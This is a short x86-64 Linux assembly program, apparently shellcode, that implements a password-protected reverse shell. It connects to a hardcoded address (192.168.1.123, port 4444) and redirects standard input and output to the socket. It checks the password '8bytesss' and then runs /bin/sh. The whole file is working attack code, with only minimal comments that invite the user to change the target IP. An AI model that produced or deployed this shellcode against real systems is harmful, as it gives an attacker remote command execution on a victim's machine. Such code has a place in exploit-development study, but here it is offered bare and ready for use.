global _start

section .text

_start:

        ; create socket
        mov rax, 41
        mov rdi, 2
        mov rsi, 1
        mov rdx, 0
        syscall

        mov rdi, rax

        xor rax, rax

        push rax
        ; change IP as reverse hex as needed
        mov dword [rsp-4], 0x7b01a8c0
        mov word [rsp-6], 0x5c11
        mov word [rsp-8], 0x2
        sub rsp, 8


        ;connect(sock, (struct sockaddr *)&server, sockaddr_len)
        
        mov rax, 42
        mov rsi, rsp
        mov rdx, 16
        syscall

        mov rax, 33
        mov rsi, 0
        syscall

        mov rax, 33
        mov rsi, 1
        syscall

        mov rax, 33
        mov rsi, 2
        syscall

        xor rax, rax

        push r10
        mov rsi, rsp
        
        xor rdx, rdx
        mov rdx, 8
        syscall

        xor rax, rax
        ; password '8bytesss'
        mov rax, 0x7373736574796238
        mov rdi, rsi
        scasq
        jne exit

        xor rax, rax
        push rax

        mov rbx, 0x68732f2f6e69622f
        push rbx

        mov rdi, rsp

        push rax

        mov rdx, rsp

        push rdi
        mov rsi, rsp
        mov rax, 59
        syscall

exit:
        xor rax, rax
        mov rax, 60
        syscall
